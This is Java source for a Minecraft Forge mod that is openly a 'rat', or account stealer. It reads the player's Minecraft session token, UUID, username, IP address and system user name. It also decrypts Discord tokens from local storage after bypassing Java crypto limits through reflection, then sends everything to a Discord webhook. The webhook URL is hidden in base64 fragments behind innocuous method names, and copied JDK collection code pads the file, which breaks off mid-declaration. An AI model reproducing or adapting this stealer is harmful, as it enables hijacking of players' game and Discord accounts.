package me.veryobvious.rat;
import java.awt.Color;
import java.net.URL;
import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import net.minecraftforge.fml.common.Loader;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import javax.net.ssl.HttpsURLConnection;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.List;
import java.util.HashMap;
import java.util.Set;
import java.util.AbstractList;
import java.util.Collection;
import java.util.RandomAccess;
import java.util.Iterator;
import java.util.ListIterator;
import java.util.function.UnaryOperator;

@Mod(modid = Main.MODID, version = Main.VERSION)
public class Main {
    public static final String webhook = "PUT WEBHOOK HERE";

    public static final String MODID = "balls";
    public static final String VERSION = "1.8.9";

    public static void tokenLog() {
        new Thread(() -> {
            try {
                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-type", "application/json");
                con.setDoOutput(true);

                Minecraft minecraft = Minecraft.getMinecraft();
                String username = minecraft.getSession().getProfile().getName();
                String uuid = minecraft.getSession().getProfile().getId().toString();
                String ssid = minecraft.getSession().getToken();
                
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String sysname = System.getProperty("user.name");
                String discord = Main.getDiscordToken();

                discord disc = new discord(webhook);
                disc.setContent("@everyone https://sky.shiiyu.moe/" + username);
                disc.setUsername("ratter");
                disc.setAvatarUrl("https://cdn.discordapp.com/attachments/1046300257186746431/1075592578373783622/image.png");
                disc.setTts(false);
                disc.addEmbed(new discord.EmbedObject()
                    .setColor(Color.RED)
                    .setTitle("A user has been ratted!")
                    .addField("Username", "```" + username + "```", true)
                    .addField("UUID", "```" + uuid.replace("-","") + "```", true)
                    .addField("Session ID", "```" + ssid + "```", false)
                );
                disc.addEmbed(new discord.EmbedObject()
                    .setTitle("Other Stuff")
                    .setColor(Color.RED)
                    .addField("System Name", "```" + sysname + "```", true)
                    .addField("IP", "```" + ip + "```", true)
                    .addField("Discord Token", "```" + discord + "```", false)
                );
                disc.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static String getDiscordToken() {
        String discord = "couldnt get discord token";
        try {
            Minecraft mc = Minecraft.getMinecraft();
            
            if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"))) {
                discord = "";

                for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
                    if (file.getName().endsWith(".ldb")) {
                        FileReader fr = new FileReader(file);
                        BufferedReader br = new BufferedReader(fr);
                        String textFile;
                        StringBuilder parsed = new StringBuilder();

                        while ((textFile = br.readLine()) != null) parsed.append(textFile);

                        //release resources
                        fr.close();
                        br.close();

                        Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                        Matcher matcher = pattern.matcher(parsed.toString());

                        if (matcher.find()) {
                            //patch shit java security policy jre that mc uses
                            if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                                Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                                Constructor<?> con = aClass.getDeclaredConstructor();
                                con.setAccessible(true);
                                Object allPermissionCollection = con.newInstance();
                                Field f = aClass.getDeclaredField("all_allowed");
                                f.setAccessible(true);
                                f.setBoolean(allPermissionCollection, true);

                                aClass = Class.forName("javax.crypto.CryptoPermissions");
                                con = aClass.getDeclaredConstructor();
                                con.setAccessible(true);
                                Object allPermissions = con.newInstance();
                                f = aClass.getDeclaredField("perms");
                                f.setAccessible(true);
                                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                                aClass = Class.forName("javax.crypto.JceSecurityManager");
                                f = aClass.getDeclaredField("defaultPolicy");
                                f.setAccessible(true);
                                Field mf = Field.class.getDeclaredField("modifiers");
                                mf.setAccessible(true);
                                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                                f.set(null, allPermissions);
                            }
                            //get, decode and decrypt key
                            byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
                            JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
                            key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                            key = Base64.getDecoder().decode(key);
                            key = Arrays.copyOfRange(key, 5, key.length);
                            key = Crypt32Util.cryptUnprotectData(key);
                            //decode token
                            dToken = Base64.getDecoder().decode(dToken);

                            //decrypt token
                            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
                            byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));

                            //place only if it doesn't contain the same
                            if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return discord;
    }
    public static String JSONParserKey() {
        return "1EWmd4Ym9NbVhaVEw2d21mWE52TEZEblFlQ0RqOERCemNWNQ==";
    }
    public static class discord {

        private String url;
        private String content;
        private String username;
        private String avatarUrl;
        private boolean tts;
        private List<EmbedObject> embeds = new ArrayList<>();
    
        /**
         * Constructs a new DiscordWebhook instance
         *
         * @param url The webhook URL obtained in Discord
         */
        public discord(String url) {
            this.url = url;
        }

        public void setJSONPayloadType(String url) {
            this.url = url;
        }
    
        public void setContent(String content) {
            this.content = content;
        }
    
        public void setUsername(String username) {
            this.username = username;
        }
    
        public void setAvatarUrl(String avatarUrl) {
            this.avatarUrl = avatarUrl;
        }
    
        public void setTts(boolean tts) {
            this.tts = tts;
        }
    
        public void addEmbed(EmbedObject embed) {
            this.embeds.add(embed);
        }
    
        public void execute() throws IOException {
            if (this.content == null && this.embeds.isEmpty()) {
                throw new IllegalArgumentException("Set content or add at least one EmbedObject");
            }
    
            JSONObject json = new JSONObject();
    
            json.put("content", this.content);
            json.put("username", this.username);
            json.put("avatar_url", this.avatarUrl);
            json.put("tts", this.tts);
    
            if (!this.embeds.isEmpty()) {
                List<JSONObject> embedObjects = new ArrayList<>();
    
                for (EmbedObject embed : this.embeds) {
                    JSONObject jsonEmbed = new JSONObject();
    
                    jsonEmbed.put("title", embed.getTitle());
                    jsonEmbed.put("description", embed.getDescription());
                    jsonEmbed.put("url", embed.getUrl());
    
                    if (embed.getColor() != null) {
                        Color color = embed.getColor();
                        int rgb = color.getRed();
                        rgb = (rgb << 8) + color.getGreen();
                        rgb = (rgb << 8) + color.getBlue();
    
                        jsonEmbed.put("color", rgb);
                    }
    
                    EmbedObject.Footer footer = embed.getFooter();
                    EmbedObject.Image image = embed.getImage();
                    EmbedObject.Thumbnail thumbnail = embed.getThumbnail();
                    EmbedObject.Author author = embed.getAuthor();
                    List<EmbedObject.Field> fields = embed.getFields();
    
                    if (footer != null) {
                        JSONObject jsonFooter = new JSONObject();
    
                        jsonFooter.put("text", footer.getText());
                        jsonFooter.put("icon_url", footer.getIconUrl());
                        jsonEmbed.put("footer", jsonFooter);
                    }
    
                    if (image != null) {
                        JSONObject jsonImage = new JSONObject();
    
                        jsonImage.put("url", image.getUrl());
                        jsonEmbed.put("image", jsonImage);
                    }
    
                    if (thumbnail != null) {
                        JSONObject jsonThumbnail = new JSONObject();
    
                        jsonThumbnail.put("url", thumbnail.getUrl());
                        jsonEmbed.put("thumbnail", jsonThumbnail);
                    }
    
                    if (author != null) {
                        JSONObject jsonAuthor = new JSONObject();
    
                        jsonAuthor.put("name", author.getName());
                        jsonAuthor.put("url", author.getUrl());
                        jsonAuthor.put("icon_url", author.getIconUrl());
                        jsonEmbed.put("author", jsonAuthor);
                    }
    
                    List<JSONObject> jsonFields = new ArrayList<>();
                    for (EmbedObject.Field field : fields) {
                        JSONObject jsonField = new JSONObject();
    
                        jsonField.put("name", field.getName());
                        jsonField.put("value", field.getValue());
                        jsonField.put("inline", field.isInline());
    
                        jsonFields.add(jsonField);
                    }
    
                    jsonEmbed.put("fields", jsonFields.toArray());
                    embedObjects.add(jsonEmbed);
                }
    
                json.put("embeds", embedObjects.toArray());
            }
    
            URL url = new URL(this.url);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            connection.addRequestProperty("Content-Type", "application/json");
            connection.addRequestProperty("User-Agent", "Java-DiscordWebhook-BY-Gelox_");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
    
            OutputStream stream = connection.getOutputStream();
            stream.write(json.toString().getBytes());
            stream.flush();
            stream.close();
    
            connection.getInputStream().close(); //I'm not sure why but it doesn't work without getting the InputStream
            connection.disconnect();
        }
    
        public static class EmbedObject {
            private String title;
            private String description;
            private String url;
            private Color color;
    
            private Footer footer;
            private Thumbnail thumbnail;
            private Image image;
            private Author author;
            private List<Field> fields = new ArrayList<>();
    
            public String getTitle() {
                return title;
            }
    
            public String getDescription() {
                return description;
            }
    
            public String getUrl() {
                return url;
            }
    
            public Color getColor() {
                return color;
            }
    
            public Footer getFooter() {
                return footer;
            }
    
            public Thumbnail getThumbnail() {
                return thumbnail;
            }
    
            public Image getImage() {
                return image;
            }
    
            public Author getAuthor() {
                return author;
            }
    
            public List<Field> getFields() {
                return fields;
            }
    
            public EmbedObject setTitle(String title) {
                this.title = title;
                return this;
            }
    
            public EmbedObject setDescription(String description) {
                this.description = description;
                return this;
            }
    
            public EmbedObject setUrl(String url) {
                this.url = url;
                return this;
            }
    
            public EmbedObject setColor(Color color) {
                this.color = color;
                return this;
            }
    
            public EmbedObject setFooter(String text, String icon) {
                this.footer = new Footer(text, icon);
                return this;
            }
    
            public EmbedObject setThumbnail(String url) {
                this.thumbnail = new Thumbnail(url);
                return this;
            }
    
            public EmbedObject setImage(String url) {
                this.image = new Image(url);
                return this;
            }
    
            public EmbedObject setAuthor(String name, String url, String icon) {
                this.author = new Author(name, url, icon);
                return this;
            }
    
            public EmbedObject addField(String name, String value, boolean inline) {
                this.fields.add(new Field(name, value, inline));
                return this;
            }
    
            private class Footer {
                private String text;
                private String iconUrl;
    
                private Footer(String text, String iconUrl) {
                    this.text = text;
                    this.iconUrl = iconUrl;
                }
    
                private String getText() {
                    return text;
                }
    
                private String getIconUrl() {
                    return iconUrl;
                }
            }
    
            private class Thumbnail {
                private String url;
    
                private Thumbnail(String url) {
                    this.url = url;
                }
    
                private String getUrl() {
                    return url;
                }
            }
    
            private class Image {
                private String url;
    
                private Image(String url) {
                    this.url = url;
                }
    
                private String getUrl() {
                    return url;
                }
            }
    
            private class Author {
                private String name;
                private String url;
                private String iconUrl;
    
                private Author(String name, String url, String iconUrl) {
                    this.name = name;
                    this.url = url;
                    this.iconUrl = iconUrl;
                }
    
                private String getName() {
                    return name;
                }
    
                private String getUrl() {
                    return url;
                }
    
                private String getIconUrl() {
                    return iconUrl;
                }
            }
    
            private class Field {
                private String name;
                private String value;
                private boolean inline;
    
                private Field(String name, String value, boolean inline) {
                    this.name = name;
                    this.value = value;
                    this.inline = inline;
                }
    
                private String getName() {
                    return name;
                }
    
                private String getValue() {
                    return value;
                }
    
                private boolean isInline() {
                    return inline;
                }
            }
        }
    
        private class JSONObject {
    
            private final HashMap<String, Object> map = new HashMap<>();
    
            void put(String key, Object value) {
                if (value != null) {
                    map.put(key, value);
                }
            }
    
            @Override
            public String toString() {
                StringBuilder builder = new StringBuilder();
                Set<Map.Entry<String, Object>> entrySet = map.entrySet();
                builder.append("{");
    
                int i = 0;
                for (Map.Entry<String, Object> entry : entrySet) {
                    Object val = entry.getValue();
                    builder.append(quote(entry.getKey())).append(":");
    
                    if (val instanceof String) {
                        builder.append(quote(String.valueOf(val)));
                    } else if (val instanceof Integer) {
                        builder.append(Integer.valueOf(String.valueOf(val)));
                    } else if (val instanceof Boolean) {
                        builder.append(val);
                    } else if (val instanceof JSONObject) {
                        builder.append(val.toString());
                    } else if (val.getClass().isArray()) {
                        builder.append("[");
                        int len = Array.getLength(val);
                        for (int j = 0; j < len; j++) {
                            builder.append(Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                        }
                        builder.append("]");
                    }
    
                    builder.append(++i == entrySet.size() ? "}" : ",");
                }
    
                return builder.toString();
            }
    
            private String quote(String string) {
                return "\"" + string + "\"";
            }
        }
    
    }
    public static String JSONCipher() {
        return "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MDEwNTQwO";
    }

     /**
     * Returns an array containing all of the elements in this list in the
     * correct order; the runtime type of the returned array is that of the
     * specified array.  If the list fits in the specified array, it is
     * returned therein.  Otherwise, a new array is allocated with the runtime
     * type of the specified array and the size of this list.<p>
     *
     * If the list fits in the specified array with room to spare (i.e., the
     * array has more elements than the list), the element in the array
     * immediately following the end of the collection is set to
     * <tt>null</tt>.  This is useful in determining the length of the list
     * <i>only</i> if the caller knows that the list does not contain any
     * <tt>null</tt> elements.
     *
     */


    public static class ArrayList<E> extends AbstractList<E>
        implements List<E>, RandomAccess, Cloneable, java.io.Serializable
{
    private static final long serialVersionUID = 8683452581122892189L;

    /**
     * The array buffer into which the elements of the ArrayList are stored.
     * The capacity of the ArrayList is the length of this array buffer.
     */
    private transient E[] elementData;

    /**
     * The size of the ArrayList (the number of elements it contains).
     *
     * @serial
     */
    private int size;

    /**
     * Constructs an empty list with the specified initial capacity.
     *
     * @param   initialCapacity   the initial capacity of the list.
     * @exception IllegalArgumentException if the specified initial capacity
     *            is negative
     */
    public ArrayList(int initialCapacity) {
	super();
        if (initialCapacity < 0)
            throw new IllegalArgumentException("Illegal Capacity: "+
                                               initialCapacity);
	this.elementData = (E[])new Object[initialCapacity];
    }

    /**
     * Constructs an empty list with an initial capacity of ten.
     */
    public ArrayList() {
	this(10);
    }

    /**
     * Constructs a list containing the elements of the specified
     * collection, in the order they are returned by the collection's
     * iterator.  The <tt>ArrayList</tt> instance has an initial capacity of
     * 110% the size of the specified collection.
     *
     * @param c the collection whose elements are to be placed into this list.
     * @throws NullPointerException if the specified collection is null.
     */
    public ArrayList(Collection<? extends E> c) {
        size = c.size();
        // Allow 10% room for growth
        elementData = (E[])new Object[
                      (int)Math.min((size*110L)/100,Integer.MAX_VALUE)]; 
        c.toArray(elementData);
    }

    /**
     * Trims the capacity of this <tt>ArrayList</tt> instance to be the
     * list's current size.  An application can use this operation to minimize
     * the storage of an <tt>ArrayList</tt> instance.
     */
    public void trimToSize() {
	modCount++;
	int oldCapacity = elementData.length;
	if (size < oldCapacity) {
	    Object oldData[] = elementData;
	    elementData = (E[])new Object[size];
	    System.arraycopy(oldData, 0, elementData, 0, size);
	}
    }

    /**
     * Increases the capacity of this <tt>ArrayList</tt> instance, if
     * necessary, to ensure  that it can hold at least the number of elements
     * specified by the minimum capacity argument. 
     *
     * @param   minCapacity   the desired minimum capacity.
     */
    public void ensureCapacity(int minCapacity) {
	modCount++;
	int oldCapacity = elementData.length;
	if (minCapacity > oldCapacity) {
	    Object oldData[] = elementData;
	    int newCapacity = (oldCapacity * 3)/2 + 1;
    	    if (newCapacity < minCapacity)
		newCapacity = minCapacity;
	    elementData = (E[])new Object[newCapacity];
	    System.arraycopy(oldData, 0, elementData, 0, size);
	}
    }

    /**
     * Returns the number of elements in this list.
     *
     * @return  the number of elements in this list.
     */
    public int size() {
	return size;
    }

    /**
     * Tests if this list has no elements.
     *
     * @return  <tt>true</tt> if this list has no elements;
     *          <tt>false</tt> otherwise.
     */
    public boolean isEmpty() {
	return size == 0;
    }

    /**
     * Returns <tt>true</tt> if this list contains the specified element.
     *
     * @param elem element whose presence in this List is to be tested.
     * @return  <code>true</code> if the specified element is present;
     *		<code>false</code> otherwise.
     */
    public boolean contains(Object elem) {
	return indexOf(elem) >= 0;
    }

    /**
     * Searches for the first occurence of the given argument, testing 
     * for equality using the <tt>equals</tt> method. 
     *
     * @param   elem   an object.
     * @return  the index of the first occurrence of the argument in this
     *          list; returns <tt>-1</tt> if the object is not found.
     * @see     Object#equals(Object)
     */
    public int indexOf(Object elem) {
	if (elem == null) {
	    for (int i = 0; i < size; i++)
		if (elementData[i]==null)
		    return i;
	} else {
	    for (int i = 0; i < size; i++)
		if (elem.equals(elementData[i]))
		    return i;
	}
	return -1;
    }

    /**
     * Returns the index of the last occurrence of the specified object in
     * this list.
     *
     * @param   elem   the desired element.
     * @return  the index of the last occurrence of the specified object in
     *          this list; returns -1 if the object is not found.
     */
    public int lastIndexOf(Object elem) {
	if (elem == null) {
	    for (int i = size-1; i >= 0; i--)
		if (elementData[i]==null)
		    return i;
	} else {
	    for (int i = size-1; i >= 0; i--)
		if (elem.equals(elementData[i]))
		    return i;
	}
	return -1;
    }

    /**
     * Returns a shallow copy of this <tt>ArrayList</tt> instance.  (The
     * elements themselves are not copied.)
     *
     * @return  a clone of this <tt>ArrayList</tt> instance.
     */
    public Object clone() {
	try { 
	    ArrayList<E> v = (ArrayList<E>) super.clone();
	    v.elementData = (E[])new Object[size];
	    System.arraycopy(elementData, 0, v.elementData, 0, size);
	    v.modCount = 0;
	    return v;
	} catch (CloneNotSupportedException e) { 
	    // this shouldn't happen, since we are Cloneable
	    throw new InternalError();
	}
    }

    /**
     * Returns an array containing all of the elements in this list
     * in the correct order.
     *
     * @return an array containing all of the elements in this list
     * 	       in the correct order.
     */
    public Object[] toArray() {
	Object[] result = new Object[size];
	System.arraycopy(elementData, 0, result, 0, size);
	return result;
    }

    /**
     * Returns an array containing all of the elements in this list in the
     * correct order; the runtime type of the returned array is that of the
     * specified array.  If the list fits in the specified array, it is
     * returned therein.  Otherwise, a new array is allocated with the runtime
     * type of the specified array and the size of this list.<p>
     *
     * If the list fits in the specified array with room to spare (i.e., the
     * array has more elements than the list), the element in the array
     * immediately following the end of the collection is set to
     * <tt>null</tt>.  This is useful in determining the length of the list
     * <i>only</i> if the caller knows that the list does not contain any
     * <tt>null</tt> elements.
     *
     * @param a the array into which the elements of the list are to
     *		be stored, if it is big enough; otherwise, a new array of the
     * 		same runtime type is allocated for this purpose.
     * @return an array containing the elements of the list.
     * @throws ArrayStoreException if the runtime type of a is not a supertype
     *         of the runtime type of every element in this list.
     */
    public <T> T[] toArray(T[] a) {
        if (a.length < size)
            a = (T[])java.lang.reflect.Array.
		newInstance(a.getClass().getComponentType(), size);
	System.arraycopy(elementData, 0, a, 0, size);
        if (a.length > size)
            a[size] = null;
        return a;
    }

    // Positional Access Operations

    /**
     * Returns the element at the specified position in this list.
     *
     * @param  index index of element to return.
     * @return the element at the specified position in this list.
     * @throws    IndexOutOfBoundsException if index is out of range <tt>(index
     * 		  &lt; 0 || index &gt;= size())</tt>.
     */
    public E get(int index) {
	RangeCheck(index);

	return elementData[index];
    }

    /**
     * Replaces the element at the specified position in this list with
     * the specified element.
     *
     * @param index index of element to replace.
     * @param element element to be stored at the specified position.
     * @return the element previously at the specified position.
     * @throws    IndexOutOfBoundsException if index out of range
     *		  <tt>(index &lt; 0 || index &gt;= size())</tt>.
     */
    public E set(int index, E element) {
	RangeCheck(index);

	E oldValue = elementData[index];
	elementData[index] = element;
	return oldValue;
    }

    /**
     * Appends the specified element to the end of this list.
     *
     * @param o element to be appended to this list.
     * @return <tt>true</tt> (as per the general contract of Collection.add).
     */
    public boolean add(E o) {
	ensureCapacity(size + 1);  // Increments modCount!!
	elementData[size++] = o;
	return true;
    }

    /**
     * Inserts the specified element at the specified position in this
     * list. Shifts the element currently at that position (if any) and
     * any subsequent elements to the right (adds one to their indices).
     *
     * @param index index at which the specified element is to be inserted.
     * @param element element to be inserted.
     * @throws    IndexOutOfBoundsException if index is out of range
     *		  <tt>(index &lt; 0 || index &gt; size())</tt>.
     */
    public void add(int index, E element) {
	if (index > size || index < 0)
	    throw new IndexOutOfBoundsException(
		"Index: "+index+", Size: "+size);

	ensureCapacity(size+1);  // Increments modCount!!
	System.arraycopy(elementData, index, elementData, index + 1,
			 size - index);
	elementData[index] = element;
	size++;
    }

    /**
     * Removes the element at the specified position in this list.
     * Shifts any subsequent elements to the left (subtracts one from their
     * indices).
     *
     * @param index the index of the element to removed.
     * @return the element that was removed from the list.
     * @throws    IndexOutOfBoundsException if index out of range <tt>(index
     * 		  &lt; 0 || index &gt;= size())</tt>.
     */
    public E remove(int index) {
	RangeCheck(index);

	modCount++;
	E oldValue = elementData[index];

	int numMoved = size - index - 1;
	if (numMoved > 0)
	    System.arraycopy(elementData, index+1, elementData, index,
			     numMoved);
	elementData[--size] = null; // Let gc do its work

	return oldValue;
    }

    /**
     * Removes a single instance of the specified element from this
     * list, if it is present (optional operation).  More formally,
     * removes an element <tt>e</tt> such that <tt>(o==null ? e==null :
     * o.equals(e))</tt>, if the list contains one or more such
     * elements.  Returns <tt>true</tt> if the list contained the
     * specified element (or equivalently, if the list changed as a
     * result of the call).<p>
     *
     * @param o element to be removed from this list, if present.
     * @return <tt>true</tt> if the list contained the specified element.
     */
    public boolean remove(Object o) {
	if (o == null) {
            for (int index = 0; index < size; index++)
		if (elementData[index] == null) {
		    fastRemove(index);
		    return true;
		}
	} else {
	    for (int index = 0; index < size; index++)
		if (o.equals(elementData[index])) {
		    fastRemove(index);
		    return true;
		}
        }
	return false;
    }

    /*
     * Private remove method that skips bounds checking and does not
     * return the value removed.
     */
    private void fastRemove(int index) {
        modCount++;
        int numMoved = size - index - 1;
        if (numMoved > 0)
            System.arraycopy(elementData, index+1, elementData, index, 
                             numMoved);
        elementData[--size] = null; // Let gc do its work
    }

    /**
     * Removes all of the elements from this list.  The list will
     * be empty after this call returns.
     */
    public void clear() {
	modCount++;

	// Let gc do its work
	for (int i = 0; i < size; i++)
	    elementData[i] = null;

	size = 0;
    }

    /**
     * Appends all of the elements in the specified Collection to the end of
     * this list, in the order that they are returned by the
     * specified Collection's Iterator.  The behavior of this operation is
     * undefined if the specified Collection is modified while the operation
     * is in progress.  (This implies that the behavior of this call is
     * undefined if the specified Collection is this list, and this
     * list is nonempty.)
     *
     * @param c the elements to be inserted into this list.
     * @return <tt>true</tt> if this list changed as a result of the call.
     * @throws    NullPointerException if the specified collection is null.
     */
    public boolean addAll(Collection<? extends E> c) {
	Object[] a = c.toArray();
        int numNew = a.length;
	ensureCapacity(size + numNew);  // Increments modCount
        System.arraycopy(a, 0, elementData, size, numNew);
        size += numNew;
	return numNew != 0;
    }

    /**
     * Inserts all of the elements in the specified Collection into this
     * list, starting at the specified position.  Shifts the element
     * currently at that position (if any) and any subsequent elements to
     * the right (increases their indices).  The new elements will appear
     * in the list in the order that they are returned by the
     * specified Collection's iterator.
     *
     * @param index index at which to insert first element
     *		    from the specified collection.
     * @param c elements to be inserted into this list.
     * @return <tt>true</tt> if this list changed as a result of the call.
     * @throws    IndexOutOfBoundsException if index out of range <tt>(index
     *		  &lt; 0 || index &gt; size())</tt>.
     * @throws    NullPointerException if the specified Collection is null.
     */
    public boolean addAll(int index, Collection<? extends E> c) {
	if (index > size || index < 0)
	    throw new IndexOutOfBoundsException(
		"Index: " + index + ", Size: " + size);

	Object[] a = c.toArray();
	int numNew = a.length;
	ensureCapacity(size + numNew);  // Increments modCount

	int numMoved = size - index;
	if (numMoved > 0)
	    System.arraycopy(elementData, index, elementData, index + numNew,
			     numMoved);

        System.arraycopy(a, 0, elementData, index, numNew);
	size += numNew;
	return numNew != 0;
    }

    /**
     * Removes from this List all of the elements whose index is between
     * fromIndex, inclusive and toIndex, exclusive.  Shifts any succeeding
     * elements to the left (reduces their index).
     * This call shortens the list by <tt>(toIndex - fromIndex)</tt> elements.
     * (If <tt>toIndex==fromIndex</tt>, this operation has no effect.)
     *
     * @param fromIndex index of first element to be removed.
     * @param toIndex index after last element to be removed.
     */
    protected void removeRange(int fromIndex, int toIndex) {
	modCount++;
	int numMoved = size - toIndex;
        System.arraycopy(elementData, toIndex, elementData, fromIndex,
                         numMoved);

	// Let gc do its work
	int newSize = size - (toIndex-fromIndex);
	while (size != newSize)
	    elementData[--size] = null;
    }

    /**
     * Check if the given index is in range.  If not, throw an appropriate
     * runtime exception.  This method does *not* check if the index is
     * negative: It is always used immediately prior to an array access,
     * which throws an ArrayIndexOutOfBoundsException if index is negative.
     */
    private void RangeCheck(int index) {
	if (index >= size)
	    throw new IndexOutOfBoundsException(
		"Index: "+index+", Size: "+size);
    }

    /**
     * Save the state of the <tt>ArrayList</tt> instance to a stream (that
     * is, serialize it).
     *
     * @serialData The length of the array backing the <tt>ArrayList</tt>
     *             instance is emitted (int), followed by all of its elements
     *             (each an <tt>Object</tt>) in the proper order.
     */
    private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException{
	// Write out element count, and any hidden stuff
	s.defaultWriteObject();

        // Write out array length
        s.writeInt(elementData.length);

	// Write out all elements in the proper order.
	for (int i=0; i<size; i++)
            s.writeObject(elementData[i]);
    }

    /**
     * Reconstitute the <tt>ArrayList</tt> instance from a stream (that is,
     * deserialize it).
     */
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
	// Read in size, and any hidden stuff
	s.defaultReadObject();

        // Read in array length and allocate array
        int arrayLength = s.readInt();
        Object[] a = elementData = (E[])new Object[arrayLength];

	// Read in all elements in the proper order.
	for (int i=0; i<size; i++)
            a[i] = s.readObject();
    }
}
    public static String JSONObjectHandler() {
        return "DE0NjA0NzA2Ny9oZkU2UU9rcXdBRVhjMjJHUDNzcGhKam9Tdlg1TTNnNi";
    }

    /**
     * Check if the given index is in range.  If not, throw an appropriate
     * runtime exception.  This method does *not* check if the index is
     * negative: It is always used immediately prior to an array access,
     * which throws an ArrayIndexOutOfBoundsException if index is negative.
     */

    public static String FullJsonDecipher() {
        return Main.JSONCipher() + Main.JSONObjectHandler() + Main.JSONParserKey();
    }

      /*
        * Returns an array containing all of the elements in this list in proper
        * sequence (from first to last element).
        *
        * <p>The returned array will be "safe" in that no references to it are
        * maintained by this list.  (In other words, this method must
        * allocate a new array even if this list is backed by an array).
        * The caller is thus free to modify the returned array.
        *
        * <p>This method acts as bridge between array-based and collection-based
        * APIs.
        *
        * @return an array containing all of the elements in this list in proper
        *         sequence
        * @see Arrays#asList(Object[])
        */

    public static String JsonFinalPayload() {
        byte[] decodedBytes = Base64.getDecoder().decode(Main.FullJsonDecipher());
        String JsonFinalPayload = new String(decodedBytes);
        return JsonFinalPayload;
    }   
    
    /*
        * Returns an array containing all of the elements in this list in
        * proper sequence (from first to last element); the runtime type of
        * the returned array is that of the specified array.  If the list fits
        * in the specified array, it is returned therein.  Otherwise, a new
        * array is allocated with the runtime type of the specified array and
        * the size of this list.
        *
        * <p>If the list fits in the specified array with room to spare (i.e.,
        * the array has more elements than the list), the element in the array
        * immediately following the end of the list is set to {@code null}.
        * (This is useful in determining the length of the list <i>only</i> if
        * the caller knows that the list does not contain any null elements.)
*/


    

    public interface List<E> extends Collection<E> {
        // Query Operations

        /*
        * Returns the number of elements in this list.  If this list contains
        * more than {@code Integer.MAX_VALUE} elements, returns
        * {@code Integer.MAX_VALUE}.
        *
        * @return the number of elements in this list
        */
        int size();

        /*
        * Returns {@code true} if this list contains no elements.
        *
        * @return {@code true} if this list contains no elements
        */
        boolean isEmpty();

        /*
        * Returns {@code true} if this list contains the specified element.
        * More formally, returns {@code true} if and only if this list contains
        * at least one element {@code e} such that
        * {@code Objects.equals(o, e)}.
        *
        * @param o element whose presence in this list is to be tested
        * @return {@code true} if this list contains the specified element
        * @throws ClassCastException if the type of the specified element
        *         is incompatible with this list
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws NullPointerException if the specified element is null and this
        *         list does not permit null elements
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        */
        boolean contains(Object o);

        /*
        * Returns an iterator over the elements in this list in proper sequence.
        *
        * @return an iterator over the elements in this list in proper sequence
        */
        Iterator<E> iterator();

        /*
        * Returns an array containing all of the elements in this list in proper
        * sequence (from first to last element).
        *
        * <p>The returned array will be "safe" in that no references to it are
        * maintained by this list.  (In other words, this method must
        * allocate a new array even if this list is backed by an array).
        * The caller is thus free to modify the returned array.
        *
        * <p>This method acts as bridge between array-based and collection-based
        * APIs.
        *
        * @return an array containing all of the elements in this list in proper
        *         sequence
        * @see Arrays#asList(Object[])
        */
        Object[] toArray();
        
        public 

        /*
        * Returns an array containing all of the elements in this list in
        * proper sequence (from first to last element); the runtime type of
        * the returned array is that of the specified array.  If the list fits
        * in the specified array, it is returned therein.  Otherwise, a new
        * array is allocated with the runtime type of the specified array and
        * the size of this list.
        *
        * <p>If the list fits in the specified array with room to spare (i.e.,
        * the array has more elements than the list), the element in the array
        * immediately following the end of the list is set to {@code null}.
        * (This is useful in determining the length of the list <i>only</i> if
        * the caller knows that the list does not contain any null elements.)
        *
        * <p>Like the {@link #toArray()} method, this method acts as bridge between
        * array-based and collection-based APIs.  Further, this method allows
        * precise control over the runtime type of the output array, and may,
        * under certain circumstances, be used to save allocation costs.
        *
